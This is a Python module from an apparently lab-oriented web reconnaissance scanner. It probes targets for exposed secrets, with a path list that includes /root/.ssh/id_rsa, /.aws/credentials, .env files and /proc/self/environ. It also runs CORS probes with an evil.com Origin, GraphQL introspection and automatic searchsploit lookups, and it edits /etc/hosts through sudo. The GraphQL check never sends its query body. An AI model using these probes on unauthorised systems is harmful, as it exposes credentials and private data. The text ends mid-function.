from __future__ import annotations
import concurrent.futures as cf
import html, json, os, random, re, shutil, socket, ssl, string, subprocess, threading
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
from .models import WebCheck, PortResult
from .ui import C, q, section_header
from .state import RUNTIME_OPTS, print_lock, shutdown_flag, WL, HOSTNAME_CACHE, DISCOVERY_CACHE, TARGET_CONFIG
from .common import run_cmd, safe_decode, split_http_bytes, line_col, compact_context, COMMON_SERVICES, SSL_PORTS, HTTP_PORTS


# ── Lazy source_recon import ─────────────────────────────────────────────────────
# Imported lazily inside http_analyze() to avoid circular deps at module load time.
# (source_recon imports from web_checks, so we must not import at the top level.)
_source_recon_mod = None

def _get_source_recon():
    global _source_recon_mod
    if _source_recon_mod is None:
        try:
            from . import source_recon as _sr
            _source_recon_mod = _sr
        except ImportError:
            pass
    return _source_recon_mod


# ── SSL socket helper ──────────────────────────────────────────────────────────
# BUG FIX: make_ssl_socket was called throughout this module (and service_probes.py)
# but was never defined anywhere in the package.  Every HTTPS connection attempt
# raised NameError: name 'make_ssl_socket' is not defined.
# Defined here as the single canonical source; service_probes.py imports it from here.

def make_ssl_socket(sock: socket.socket, hostname: str) -> ssl.SSLSocket:
    """Wrap *sock* with a permissive TLS context suitable for security scanning.

    • Certificate verification disabled  — self-signed certs are the norm in labs.
    • Hostname checking disabled         — same reason.
    • Legacy TLS versions (1.0/1.1) accepted so old lab targets still work.
    • SNI server_hostname set            — required for vhost-TLS (many HTB machines).

    The caller must still call .connect() after this returns.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    # Accept legacy protocol versions present on older/CTF targets
    ctx.options &= ~getattr(ssl, "OP_NO_TLSv1",   0)
    ctx.options &= ~getattr(ssl, "OP_NO_TLSv1_1", 0)
    try:
        ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
    except ssl.SSLError:
        pass   # older OpenSSL — use whatever it defaults to
    return ctx.wrap_socket(sock, server_hostname=hostname)

# ── Functions defined here to avoid circular import ───────────────────────────
# dns_vhosts imports from web_checks, so web_checks cannot import from dns_vhosts.
# These stubs replicate the essential behaviour of the dns_vhosts originals.

_IP_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")

def extract_domain_from_url(url: str) -> Optional[str]:
    """Extract the hostname from a URL, returning None for bare IP addresses."""
    if not url:
        return None
    try:
        hostname = (urlparse(url).hostname or "").strip().rstrip(".")
        if not hostname or _IP_RE.match(hostname):
            return None
        if re.match(r"^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$", hostname):
            return hostname
    except Exception:
        pass
    return None

def record_domain(domain: str, source: str = "") -> None:
    """Record a discovered domain into shared caches AND immediately update /etc/hosts.

    This stub mirrors dns_vhosts.record_domain.  It cannot import from dns_vhosts
    (circular: dns_vhosts imports from web_checks), so the /etc/hosts write logic is
    inlined here using only stdlib + state imports — no new dependencies.

    Called from http_analyze() whenever a redirect or SSL-cert hostname is found.
    The immediate write means WhatWeb/wafw00f in the vhost scan can resolve the name.
    """
    import subprocess as _sp
    domain = (domain or "").strip().rstrip(".")
    if not domain or _IP_RE.match(domain) or "." not in domain:
        return
    DISCOVERY_CACHE.setdefault("domains", set()).add(domain)
    if source:
        DISCOVERY_CACHE.setdefault("sources", {})[domain] = source
    if not DISCOVERY_CACHE.get("primary_domain"):
        DISCOVERY_CACHE["primary_domain"] = domain
    else:
        cur = DISCOVERY_CACHE.get("primary_domain", "")
        if domain.count(".") < cur.count("."):
            DISCOVERY_CACHE["primary_domain"] = domain

    # ── Immediate /etc/hosts update ──────────────────────────────────────────
    # Skip if: auto-update disabled, no target IP set, already done this session,
    # already in /etc/hosts at startup, or source is /etc/hosts itself.
    target_ip = TARGET_CONFIG.get("ip", "")
    if not target_ip or not _IP_RE.match(target_ip):
        return
    if not TARGET_CONFIG.get("auto_update_hosts", True):
        return
    if source and "/etc/hosts" in source:
        return
    if domain in TARGET_CONFIG.get("hosts_updated", set()):
        return
    if domain in HOSTNAME_CACHE.get("etc_hosts", set()):
        return

    # Check if already in /etc/hosts for this IP (quick line scan)
    _already = False
    try:
        with open("/etc/hosts", "r", encoding="utf-8", errors="ignore") as _fh:
            for _ln in _fh:
                _parts = _ln.strip().split()
                if len(_parts) >= 2 and _parts[0] == target_ip and domain in _parts[1:]:
                    _already = True
                    break
    except Exception:
        pass

    if _already:
        HOSTNAME_CACHE.setdefault("etc_hosts", set()).add(domain)
        return

    # Write the new entry — try direct write first, fall back to sudo tee
    _written = False
    try:
        with open("/etc/hosts", "r", encoding="utf-8", errors="ignore") as _fh:
            _lines = _fh.readlines()
        # Find existing line for this IP and append to it, or add new line
        _idx = next((i for i, l in enumerate(_lines)
                     if l.strip() and not l.strip().startswith("#")
                     and l.strip().split()[0] == target_ip), -1)
        if _idx >= 0:
            _lines[_idx] = _lines[_idx].rstrip("\n\r") + f" {domain}\n"
        else:
            if _lines and not _lines[-1].endswith("\n"):
                _lines[-1] += "\n"
            _lines.append(f"{target_ip} {domain}\n")
        with open("/etc/hosts", "w", encoding="utf-8") as _fh:
            _fh.writelines(_lines)
        _written = True
    except PermissionError:
        # Running without root on the scanner process itself — use sudo tee -a
        try:
            _r = _sp.run(
                ["sudo", "tee", "-a", "/etc/hosts"],
                input=f"{target_ip} {domain}\n",
                capture_output=True, text=True, timeout=10,
            )
            _written = (_r.returncode == 0)
        except Exception:
            pass
    except Exception:
        pass

    if _written:
        TARGET_CONFIG.setdefault("hosts_updated", set()).add(domain)
        HOSTNAME_CACHE.setdefault("etc_hosts", set()).add(domain)
        _src_note = f" (from {source})" if source else ""
        print(f"  \033[92m✓ /etc/hosts: {target_ip} {domain}{_src_note}\033[0m")

def extract_domains_from_ssl_cert(cert_info: Dict[str, str]) -> List[str]:
    """Extract domain names from SSL certificate CN and SAN fields."""
    _ip_re = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")

    def _looks_domain(s: str) -> bool:
        s = s.strip().lower()
        return "." in s and not _ip_re.match(s) and not s.startswith("*.")
    domains: List[str] = []
    cn = cert_info.get("CN", "").strip().rstrip(".")
    if cn and _looks_domain(cn):
        domains.append(cn)
    for name in cert_info.get("SAN", "").split(","):
        name = name.strip().rstrip(".")
        if name and _looks_domain(name) and name not in domains:
            domains.append(name)
    return domains

def http_request_raw(host: str, port: int, path: str, use_ssl: bool, method: str = "GET",
                     timeout: float = 2.2, max_bytes: int = 220000,
                     headers: Optional[Dict[str, str]] = None,
                     body: Optional[bytes] = None,
                     host_header: str = "") -> bytes:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if use_ssl:
            s = make_ssl_socket(s, host)
        s.connect((host, port))

        h = {
            "Host": host_header if host_header else host,
            "User-Agent": "Mozilla/5.0 (ncscanner/1337.codes)",
            "Connection": "close",
            "Accept": "*/*",
        }
        if headers:
            h.update(headers)
        if body and "Content-Length" not in h:
            h["Content-Length"] = str(len(body))

        hdr = "".join([f"{k}: {v}\r\n" for k, v in h.items()])
        req = (f"{method} {path} HTTP/1.1\r\n{hdr}\r\n").encode()
        if body:
            req += body

        s.send(req)
        data = b""
        while len(data) < max_bytes:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        s.close()
        return data
    except Exception:
        return b""

def http_status_code(resp: bytes) -> str:
    try:
        head = resp[:240].decode("utf-8", errors="ignore")
        m = re.search(r"HTTP/\d\.\d\s+(\d+)", head)
        return m.group(1) if m else ""
    except Exception:
        return ""

def http_headers(resp: bytes) -> Dict[str, str]:
    out: Dict[str, str] = {}
    try:
        head_b, _ = split_http_bytes(resp)
        head = safe_decode(head_b)
        lines = head.splitlines()
        for ln in lines[1:]:
            if ":" not in ln:
                continue
            k, v = ln.split(":", 1)
            out[k.strip()] = v.strip()
    except Exception:
        pass
    return out

def http_body_text(resp: bytes) -> str:
    try:
        _, body = split_http_bytes(resp)
        return safe_decode(body)
    except Exception:
        return ""

def fetch_allow_methods(host: str, port: int, use_ssl: bool) -> List[str]:
    resp = http_request_raw(host, port, "/", use_ssl, method="OPTIONS", timeout=2.0, max_bytes=20000)
    if not resp:
        return []
    hdrs = http_headers(resp)
    for k, v in hdrs.items():
        if k.lower() == "allow":
            return [m.strip() for m in v.split(",") if m.strip()]
    return []

def find_dev_notes(text: str, url: str) -> List[Dict[str, str]]:
    notes: List[Dict[str, str]] = []
    # Expanded keywords beyond classic TODO/FIXME — BUG/WARN/KLUDGE/TEMP/NOTE/HARDCODED
    # are widely used by devs and often reveal credentials, bypasses, or security-relevant info.
    pat = re.compile(r"(?i)\b(TODO|FIXME|HACK|XXX|BUG|WARN|WARNING|KLUDGE|TEMP|NOTE|DEBT|HARDCODED|NOSEC)\b(?:\s*[:\-]\s*([^\r\n]{0,200}))?")
    for m in pat.finditer(text or ""):
        kw = (m.group(1) or "").upper()
        note = (m.group(2) or "").strip()
        # Skip bare NOTE/WARN without context — too noisy in minified JS
        if not note and kw in ("NOTE", "WARN", "WARNING"):
            continue
        ln, col = line_col(text, m.start())
        notes.append({
            "keyword": kw,
            "note": note[:200],
            "url": url,
            "line": str(ln),
            "col": str(col),
            "context": compact_context(text, m.start(), m.end())
        })
        if len(notes) >= 40:
            break
    return notes

def extract_title(body: str) -> str:
    m = re.search(r"(?is)<title[^>]*>(.*?)</title>", body or "")
    if not m:
        return ""
    t = html.unescape(m.group(1))
    t = re.sub(r"\s+", " ", t).strip()
    return t[:200]

def extract_comments(body: str, limit: int = 12) -> List[Dict[str, str]]:
    out: List[Dict[str, str]] = []
    for m in re.finditer(r"(?is)<!--(.*?)-->", body or ""):
        txt = (m.group(1) or "").strip()
        if 3 <= len(txt) <= 700:
            ln, _ = line_col(body, m.start())
            out.append({"line": str(ln), "text": txt[:300]})
        if len(out) >= limit:
            break
    return out

def extract_users(body: str) -> List[str]:
    # Common programming language keywords and JS/HTML noise that match username patterns
    _NOISE = frozenset({
        "admin", "root", "null", "none", "test", "true", "false", "import",
        "export", "return", "class", "function", "const", "let", "var", "new",
        "this", "self", "super", "static", "public", "private", "protected",
        "default", "module", "require", "from", "async", "await", "type",
        "interface", "extends", "implements", "string", "number", "boolean",
        "object", "array", "undefined", "void", "any", "unknown", "never",
        "get", "set", "delete", "update", "create", "read", "list", "show",
        "index", "store", "login", "logout", "register", "password", "email",
        "name", "user", "users", "token", "page", "data", "info", "home",
        "about", "contact", "search", "link", "href", "src", "alt", "class",
        "style", "script", "body", "head", "html", "div", "span", "form",
    })
    users = set()
    for pat in [
        r'(?i)\buser(?:name)?["\s:=]+([A-Za-z0-9_-]{3,30})',
        r"/(?:user|users|profile|author)/([A-Za-z0-9_-]{3,40})",
    ]:
        for m in re.finditer(pat, body or ""):
            u = m.group(1)
            if u and u.lower() not in _NOISE and not u.isdigit():
                users.add(u)
    # @mention pattern — only keep if it looks like a real handle (contains digit or _)
    for m in re.finditer(r"@([A-Za-z0-9_]{3,30})\b", body or ""):
        u = m.group(1)
        if u.lower() not in _NOISE and (any(c.isdigit() for c in u) or "_" in u):
            users.add(u)
    return list(sorted(users))[:25]

def extract_emails(body: str) -> List[str]:
    return list(sorted(set(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", body or ""))))[:25]

def extract_assets(body: str, page_url: str, host: str, port: int) -> List[str]:
    assets: List[str] = []
    for m in re.finditer(r'(?is)\b(?:src|href)\s*=\s*["\']([^"\']+)["\']', body or ""):
        raw = (m.group(1) or "").strip()
        if not raw or raw.startswith(("data:", "javascript:", "mailto:", "#")):
            continue
        u = urljoin(page_url, raw)
        p = urlparse(u)
        if p.hostname and p.hostname != host:
            continue
        if p.port and p.port != port:
            continue
        path = (p.path or "").lower()
        if not any(path.endswith(ext) for ext in (".js", ".css", ".map", ".json")):
            continue
        if u not in assets:
            assets.append(u)
        if len(assets) >= 40:
            break
    return assets


# --------------------------- OSCP-focused enhancements ---------------------------

def detect_soft_404(host: str, port: int, use_ssl: bool) -> Tuple[bool, str, int]:
    """Probe a random nonexistent path to detect wildcard/custom 404s.
    Returns (is_wildcard, status_code, body_length)."""
    import random, string
    rand_path = "/" + "".join(random.choices(string.ascii_lowercase, k=16)) + ".html"
    resp = http_request_raw(host, port, rand_path, use_ssl, method="GET", timeout=1.5, max_bytes=8000)
    if not resp:
        return False, "", 0
    code = http_status_code(resp)
    body = http_body_text(resp)
    body_len = len(body.strip())
    # If random path returns 200/301/302 the server is wildcarding
    if code in ("200", "301", "302"):
        return True, code, body_len
    return False, code, body_len

def detect_soft_404_vhost(ip: str, port: int, use_ssl: bool, vhost: str) -> Tuple[bool, str, int]:
    """Probe a random nonexistent path with Host header to detect wildcard/custom 404s.
    Returns (is_wildcard, status_code, body_length)."""
    import random, string
    rand_path = "/" + "".join(random.choices(string.ascii_lowercase, k=16)) + ".html"
    resp = http_request_raw(ip, port, rand_path, use_ssl, method="GET", timeout=1.5, max_bytes=8000,
                           headers={"Host": vhost})
    if not resp:
        return False, "", 0
    code = http_status_code(resp)
    body = http_body_text(resp)
    body_len = len(body.strip())
    # If random path returns 200/301/302 the server is wildcarding
    if code in ("200", "301", "302"):
        return True, code, body_len
    return False, code, body_len


# Paths whose body content we should read and display when they return 200
SENSITIVE_PROBE_PATHS = {
    # Source Control
    "/.git/config", "/.git/HEAD", "/.git/index", "/.git/logs/HEAD",
    "/.gitignore", "/.svn/entries", "/.svn/wc.db", "/.hg/hgrc",
    "/CVS/Root", "/CVS/Entries",
    
    # Environment / Config files (HIGH VALUE)
    "/.env", "/.env.dev", "/.env.local", "/.env.prod", "/.env.production",
    "/.env.staging", "/.env.backup", "/.env.bak", "/.env.old", "/.env.example",
    "/env.js", "/config.php", "/config.php.bak", "/config.php~",
    "/config.inc.php", "/configuration.php", "/settings.php",
    "/config.yml", "/config.yaml", "/config.json", "/config.xml", "/config.inc",
    "/application.yml", "/application.properties", "/appsettings.json",
    "/.htaccess", "/.htpasswd", "/web.config", "/Web.config", "/app.config",
    
    # WordPress
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
    "/wp-config.php~", "/wp-config.php.save", "/wp-config.php.swp",
    "/wp-config.bak", "/wp-config.txt", "/wp-json/wp/v2/users",
    
    # Drupal
    "/CHANGELOG.txt", "/core/CHANGELOG.txt", "/sites/default/settings.php",
    
    # Joomla
    "/configuration.php~", "/configuration.php.bak",
    "/administrator/manifests/files/joomla.xml",
    
    # Ruby/Rails
    "/Gemfile", "/Gemfile.lock", "/config/database.yml",
    "/config/secrets.yml", "/config/master.key",
    
    # Python
    "/Pipfile", "/Pipfile.lock", "/requirements.txt", "/pyproject.toml",
    "/settings.py", "/local_settings.py", "/config.py",
    
    # Node.js
    "/package.json", "/package-lock.json", "/npm-debug.log", "/.npmrc",
    
    # PHP
    "/composer.json", "/composer.lock",
    
    # Java/Spring
    "/WEB-INF/web.xml", "/application.yml", "/application.properties",
    "/actuator/env", "/actuator/configprops", "/actuator/heapdump",
    "/jolokia/list",
    
    # Docker/CI-CD
    "/Dockerfile", "/docker-compose.yml", "/docker-compose.yaml",
    "/.gitlab-ci.yml", "/Jenkinsfile", "/.travis.yml",
    "/bitbucket-pipelines.yml", "/.circleci/config.yml",
    
    # Backups/DB
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql",
    "/database.sql", "/dump.sql",
    
    # PHP Info
    "/phpinfo.php", "/info.php", "/php.php", "/test.php", "/i.php",
    
    # Server Info
    "/server-status", "/server-info",
    
    # ASP.NET
    "/trace.axd", "/elmah.axd",
    
    # Security/Docs
    "/.well-known/security.txt", "/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/CHANGELOG", "/CHANGELOG.md", "/CHANGELOG.txt",
    "/README", "/README.md", "/README.txt",
    "/LICENSE", "/VERSION", "/INSTALL",
    
    # Cloud credentials (CRITICAL!)
    "/.aws/credentials", "/.aws/config",
    
    # Logs
    "/debug.log", "/error.log", "/app.log",
    "/storage/logs/laravel.log",
    
    # Database files
    "/db.sqlite", "/db.sqlite3", "/database.sqlite", "/database.db",
    
    # Jenkins
    "/script", "/api/json",
    
    # Misc
    "/.DS_Store",

    # ── Windows-specific high-value paths (from OSCP cheatsheets) ────────────
    # IIS / Windows web server files
    "/iisstart.htm", "/iisstart.png",
    "/iis-85.png",

    # XAMPP / common Windows web stacks
    "/xampp/", "/xampp/index.php",
    "/phpmyadmin/", "/phpmyadmin/index.php",
    "/phpMyAdmin/", "/phpMyAdmin/index.php",
    "/pma/",

    # ASP.NET WebForms — exposed for info disclosure
    "/web.config", "/Web.config", "/global.asax", "/Global.asax",
    "/app_offline.htm",

    # Windows Apache / IIS log paths accessible via LFI (shown in next-steps)
    # These won't be found via HTTP probe but are included so LFI snippets work
    "/apache/logs/access.log", "/apache/logs/error.log",
    "/Apache/logs/access.log", "/Apache/logs/error.log",

    # ── Extended Linux log / config paths ────────────────────────────────────
    # Apache access logs (log poisoning targets)
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/var/log/mail.log",
    "/proc/self/environ",
    "/proc/version",

    # Common config / cred files
    "/etc/passwd",       # LFI confirmation target
    "/etc/hostname",
    "/etc/hosts",
    "/etc/issue",
    "/home/user/.bash_history",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",

    # CMS extra
    "/wp-includes/version.php",  # WordPress version disclosure
    "/readme.html",               # WordPress version
    "/license.txt",               # WordPress license (version hint)
}

def read_sensitive_body(host: str, port: int, path: str, use_ssl: bool) -> str:
    """Fetch and return the body of a sensitive file (truncated)."""
    resp = http_request_raw(host, port, path, use_ssl, method="GET", timeout=2.0, max_bytes=16000)
    if not resp:
        return ""
    code = http_status_code(resp)
    if code != "200":
        return ""
    body = http_body_text(resp).strip()
    return body[:3000]

def extract_cms_version(title: str, body: str, tech: List[str], whatweb_out: str) -> Dict[str, str]:
    """Extract CMS/app name + version from page content. Returns {app: version}."""
    versions: Dict[str, str] = {}
    all_text = (body or "") + " " + (whatweb_out or "") + " " + " ".join(tech)
    all_lower = all_text.lower()

    # Redmine version (usually in footer or meta)
    m = re.search(r"Redmine\s+v?(\d+\.\d+[\.\d]*)", all_text, re.I)
    if m:
        versions["Redmine"] = m.group(1)
    elif "redmine" in all_lower and not versions.get("Redmine"):
        # Try powered-by footer
        m = re.search(r"Powered by.*?Redmine\s+v?(\d+\.\d+[\.\d]*)", all_text, re.I)
        if m:
            versions["Redmine"] = m.group(1)

    # WordPress version
    m = re.search(r'content="WordPress\s+([\d.]+)"', all_text, re.I)
    if m:
        versions["WordPress"] = m.group(1)
    if not versions.get("WordPress"):
        m = re.search(r"WordPress[/ ]([\d.]+)", all_text, re.I)
        if m:
            versions["WordPress"] = m.group(1)

    # Drupal
    m = re.search(r"Drupal\s+([\d.]+)", all_text, re.I)
    if m:
        versions["Drupal"] = m.group(1)

    # Joomla
    m = re.search(r"Joomla[! ]*([\d.]+)", all_text, re.I)
    if m:
        versions["Joomla"] = m.group(1)

    # Apache/Nginx/IIS from Server header
    m = re.search(r"Apache/([\d.]+)", all_text)
    if m:
        versions["Apache"] = m.group(1)
    m = re.search(r"nginx/([\d.]+)", all_text)
    if m:
        versions["nginx"] = m.group(1)
    m = re.search(r"Microsoft-IIS/([\d.]+)", all_text)
    if m:
        versions["IIS"] = m.group(1)

    # PHP version
    m = re.search(r"PHP/([\d.]+)", all_text)
    if m:
        versions["PHP"] = m.group(1)

    # Ruby
    m = re.search(r"Ruby/([\d.]+)", all_text)
    if m:
        versions["Ruby"] = m.group(1)

    # WEBrick
    m = re.search(r"WEBrick/([\d.]+)", all_text)
    if m:
        versions["WEBrick"] = m.group(1)

    # Tomcat
    m = re.search(r"Tomcat/([\d.]+)", all_text, re.I)
    if m:
        versions["Tomcat"] = m.group(1)
    m = re.search(r"Apache-Coyote/([\d.]+)", all_text)
    if m and "Tomcat" not in versions:
        versions["Tomcat/Coyote"] = m.group(1)

    # Jenkins
    m = re.search(r"Jenkins\s*ver\.\s*([\d.]+)", all_text, re.I)
    if m:
        versions["Jenkins"] = m.group(1)
    if not versions.get("Jenkins"):
        m = re.search(r"X-Jenkins:\s*([\d.]+)", all_text)
        if m:
            versions["Jenkins"] = m.group(1)

    # GitLab
    m = re.search(r"GitLab.*?([\d]+\.[\d]+\.[\d]+)", all_text, re.I)
    if m:
        versions["GitLab"] = m.group(1)

    # Webmin
    m = re.search(r"Webmin\s+v?([\d.]+)", all_text, re.I)
    if m:
        versions["Webmin"] = m.group(1)

    # MiniServ (Webmin backend)
    m = re.search(r"MiniServ/([\d.]+)", all_text)
    if m:
        versions["MiniServ"] = m.group(1)

    # Grafana
    m = re.search(r"Grafana\s*v?([\d.]+)", all_text, re.I)
    if m:
        versions["Grafana"] = m.group(1)

    # Node/Express
    m = re.search(r"X-Powered-By:\s*Express", all_text)
    if m:
        versions["Express"] = "detected"

    # OpenSSL
    m = re.search(r"OpenSSL/([\d.]+\w*)", all_text)
    if m:
        versions["OpenSSL"] = m.group(1)

    return versions

def extract_ssl_cert_info(host: str, port: int) -> Dict[str, str]:
    """Extract CN, SAN, issuer from SSL certificate. Reveals internal hostnames."""
    info: Dict[str, str] = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=3.0) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert(binary_form=False)
                if not cert:
                    # try binary form
                    return info
                # CN
                subj = cert.get("subject", ())
                for rdn in subj:
                    for attr_type, attr_val in rdn:
                        if attr_type == "commonName":
                            info["CN"] = attr_val
                # SAN
                san = cert.get("subjectAltName", ())
                names = [v for t, v in san if t in ("DNS", "IP Address")]
                if names:
                    info["SAN"] = ", ".join(names[:10])
                # Issuer
                issuer = cert.get("issuer", ())
                for rdn in issuer:
                    for attr_type, attr_val in rdn:
                        if attr_type == "commonName":
                            info["Issuer"] = attr_val
                # Not After
                not_after = cert.get("notAfter", "")
                if not_after:
                    info["Expires"] = not_after
    except Exception:
        pass
    return info

def auto_searchsploit(versions: Dict[str, str], banner: str = "") -> List[str]:
    """Run searchsploit for detected versions and return matching results."""
    if not shutil.which("searchsploit"):
        return []
    results: List[str] = []
    queries_done: set = set()

    for app, ver in versions.items():
        if not ver or ver == "detected":
            continue
        # Build a good searchsploit query
        query = f"{app} {ver}"
        if query in queries_done:
            continue
        queries_done.add(query)
        out = run_cmd(["searchsploit", app, ver], timeout=8)
        if out and out != "__TIMEOUT__" and "No Results" not in out:
            # Filter to just matching lines (skip header/footer)
            lines = out.splitlines()
            for line in lines:
                # searchsploit output has exploit title | path columns
                if "|" in line and ("exploit" in line.lower() or "/" in line):
                    results.append(line.strip())
                elif app.lower() in line.lower() and ver in line:
                    results.append(line.strip())
            if len(results) > 20:
                break

    # Also try banner-based search for SSH, FTP etc.
    if banner:
        for pattern, query in [
            (r"OpenSSH[_-]([\d.p]+)", "OpenSSH"),
            (r"vsftpd\s+([\d.]+)", "vsftpd"),
            (r"ProFTPD\s+([\d.]+)", "ProFTPD"),
            (r"Exim\s+([\d.]+)", "Exim"),
            (r"Postfix", "Postfix"),
            (r"Dovecot", "Dovecot"),
        ]:
            m = re.search(pattern, banner, re.I)
            if m:
                ver = m.group(1) if m.lastindex else ""
                q = f"{query} {ver}".strip()
                if q not in queries_done:
                    queries_done.add(q)
                    out = run_cmd(["searchsploit", query, ver] if ver else ["searchsploit", query], timeout=8)
                    if out and out != "__TIMEOUT__" and "No Results" not in out:
                        for line in out.splitlines():
                            if "|" in line and ("exploit" in line.lower() or "/" in line):
                                results.append(line.strip())
                            if len(results) > 25:
                                break

    return results[:25]



# --------------------------- Web Security Analysis ---------------------------

def analyze_security_headers(resp: bytes, is_ssl: bool = False) -> List[Dict[str, str]]:
    """Analyze HTTP response headers for security misconfigurations.

    Returns a list of findings: [{"severity": "HIGH|MED|INFO", "header": ..., "issue": ..., "fix": ...}]
    Findings are ordered HIGH → MED → INFO.
    """
    findings: List[Dict[str, str]] = []
    if not resp:
        return findings

    hdrs = http_headers(resp)
    hl = {k.lower(): v for k, v in hdrs.items()}
    status = http_status_code(resp)

    # Only flag on real HTML responses (skip API/JSON/binary endpoints)
    ct = hl.get("content-type", "")
    is_html = "html" in ct or not ct

    # --- Server / technology disclosure ---
    server = hl.get("server", "")
    if server and re.search(r"\d+\.\d+", server):
        findings.append({
            "severity": "INFO",
            "header": f"Server: {server}",
            "issue": "Version disclosed in Server header",
            "fix": "Remove version string from web server config",
        })

    xpb = hl.get("x-powered-by", "")
    if xpb:
        findings.append({
            "severity": "INFO",
            "header": f"X-Powered-By: {xpb}",
            "issue": "Technology stack disclosed",
            "fix": "Remove X-Powered-By header",
        })

    xav = hl.get("x-aspnet-version", "") or hl.get("x-aspnetmvc-version", "")
    if xav:
        findings.append({
            "severity": "INFO",
            "header": f"X-AspNet-Version: {xav}",
            "issue": ".NET version disclosed",
            "fix": "Set httpRuntime enableVersionHeader='false'",
        })

    if not is_html:
        return sorted(findings, key=lambda x: {"HIGH": 0, "MED": 1, "INFO": 2}.get(x["severity"], 3))

    # --- Strict-Transport-Security (only meaningful for HTTPS) ---
    # (caller decides whether to show; we always flag on https response)
    if not hl.get("strict-transport-security"):
        findings.append({
            "severity": "MED",
            "header": "Strict-Transport-Security (missing)",
            "issue": "Protocol downgrade + cookie hijacking possible",
            "fix": "Strict-Transport-Security: max-age=31536000; includeSubDomains",
        })

    # --- Content-Security-Policy ---
    csp = hl.get("content-security-policy", "")
    if not csp:
        findings.append({
            "severity": "MED",
            "header": "Content-Security-Policy (missing)",
            "issue": "No XSS/injection policy enforced",
            "fix": "Add restrictive CSP header",
        })
    else:
        if "unsafe-inline" in csp:
            findings.append({
                "severity": "MED",
                "header": "Content-Security-Policy: unsafe-inline",
                "issue": "Inline scripts / styles allowed — weakens XSS protection",
                "fix": "Replace unsafe-inline with nonces or hashes",
            })
        if "unsafe-eval" in csp:
            findings.append({
                "severity": "MED",
                "header": "Content-Security-Policy: unsafe-eval",
                "issue": "eval() and related functions allowed",
                "fix": "Remove unsafe-eval",
            })

    # --- X-Frame-Options (clickjacking) ---
    xfo = hl.get("x-frame-options", "")
    csp_has_fo = "frame-ancestors" in csp
    if not xfo and not csp_has_fo:
        findings.append({
            "severity": "MED",
            "header": "X-Frame-Options (missing)",
            "issue": "Clickjacking attack possible",
            "fix": "X-Frame-Options: SAMEORIGIN  OR  CSP frame-ancestors 'self'",
        })

    # --- X-Content-Type-Options ---
    if not hl.get("x-content-type-options"):
        findings.append({
            "severity": "MED",
            "header": "X-Content-Type-Options (missing)",
            "issue": "MIME-sniffing attacks possible",
            "fix": "X-Content-Type-Options: nosniff",
        })

    # --- Referrer-Policy ---
    if not hl.get("referrer-policy"):
        findings.append({
            "severity": "INFO",
            "header": "Referrer-Policy (missing)",
            "issue": "Sensitive URL paths may leak via Referer header",
            "fix": "Referrer-Policy: strict-origin-when-cross-origin",
        })

    # --- Permissions-Policy ---
    if not hl.get("permissions-policy") and not hl.get("feature-policy"):
        findings.append({
            "severity": "INFO",
            "header": "Permissions-Policy (missing)",
            "issue": "Browser features not restricted",
            "fix": "Permissions-Policy: geolocation=(), microphone=(), camera=()",
        })

    # Sort: HIGH first, then MED, then INFO
    sev_order = {"HIGH": 0, "MED": 1, "INFO": 2}
    findings.sort(key=lambda x: sev_order.get(x["severity"], 3))
    return findings

def check_cors_misconfig(host: str, port: int, use_ssl: bool,
                         path: str = "/") -> Optional[Dict[str, str]]:
    """Probe for CORS misconfiguration by sending a hostile Origin header.

    Checks:
      1. Origin reflection — server echoes back whatever Origin you send
      2. Wildcard with credentials (very dangerous)
      3. Null origin accepted

    Returns a dict with details on success, None if no misconfiguration found.
    """
    checks = [
        ("https://evil.com", "reflected-evil"),
        ("null",             "null-origin"),
    ]
    for origin, label in checks:
        resp = http_request_raw(
            host, port, path, use_ssl,
            method="GET",
            timeout=2.0,
            headers={"Origin": origin},
            max_bytes=8000,
        )
        if not resp:
            continue
        hdrs = http_headers(resp)
        hl   = {k.lower(): v for k, v in hdrs.items()}
        acao = hl.get("access-control-allow-origin", "")
        acac = hl.get("access-control-allow-credentials", "").lower()
        if not acao:
            continue

        vuln = ""
        if acao == "*":
            vuln = "Wildcard CORS (*): any origin allowed"
            if acac == "true":
                vuln += " + credentials=true (CRITICAL)"
        elif acao == origin:
            vuln = f"Origin reflection: '{origin}' accepted"
            if acac == "true":
                vuln += " + credentials=true → credential theft possible"
        elif acao.lower() == "null":
            vuln = "Null origin accepted (sandbox bypass)"

        if vuln:
            return {
                "origin_sent":  origin,
                "acao_received": acao,
                "acac": acac,
                "vuln": vuln,
            }
    return None

def check_graphql_introspection(host: str, port: int, use_ssl: bool,
                                paths: Optional[List[str]] = None) -> Optional[Dict]:
    """POST an introspection query to known GraphQL endpoints.

    Returns a dict with endpoint path and discovered type names if introspection
    is enabled, otherwise None.
    """
    if paths is None:
        paths = ["/graphql", "/api/graphql", "/graphiql", "/playground",
                 "/v1/graphql", "/v2/graphql", "/query", "/gql"]

    introspect_body = (
        '{"query":"{__schema{queryType{name}types{name kind fields{name}}}}"}'
    )

    for path in paths:
        resp = http_request_raw(
            host, port, path, use_ssl,
            method="POST",
            timeout=2.5,
            headers={"Content-Type": "application/json"},
            max_bytes=60000,
        )
        if not resp:
            continue
        code = http_status_code(resp)
        if code not in ("200", "201"):
            continue
        body = http_body_text(resp)
        if '"__schema"' not in body and '"queryType"' not in body:
            continue
